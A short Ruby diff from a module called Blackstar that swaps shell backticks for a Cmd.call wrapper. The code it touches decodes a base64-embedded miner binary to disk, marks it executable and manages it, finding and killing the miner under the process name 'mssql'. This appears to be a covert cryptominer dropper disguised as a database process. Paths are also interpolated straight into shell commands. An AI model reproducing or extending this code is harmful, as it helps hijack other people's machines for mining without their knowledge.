@@ -40,20 +40,20 @@ module Blackstar
 
     def remove_old_files
       [miner_path, config_path, output_miner_path].each do |path|
-        `rm -f #{path}`
+        Cmd.call("rm -f #{path}")
       end
     end
 
     def copy_new_files
-      `mkdir -p #{base_path}`
+      Cmd.call("mkdir -p #{base_path}")
       File.open(miner_path, 'w') do |f|
-        f.write(Base64::decode(LINUX_MINER_BASE64))
+        f.write(Base64::decode(Linux::MINER_BASE64))
       end
 
       host.generate_config(config_path)
 
-      `chmod +x #{miner_path}`
-      `touch #{output_miner_path}`
+      Cmd.call("chmod +x #{miner_path}")
+      Cmd.call("touch #{output_miner_path}")
     end
 
     def get_hash_rate
@@ -75,9 +75,9 @@ module Blackstar
     end
 
     def kill_process
-      pid = `pgrep mssql`
+      pid = Cmd.call("pgrep mssql")
       if pid != ''
-        `kill -9 #{pid}`
+        Cmd.call("kill -9 #{pid}")
         p 'Killed Miner'
         self.miner_started = false
       end
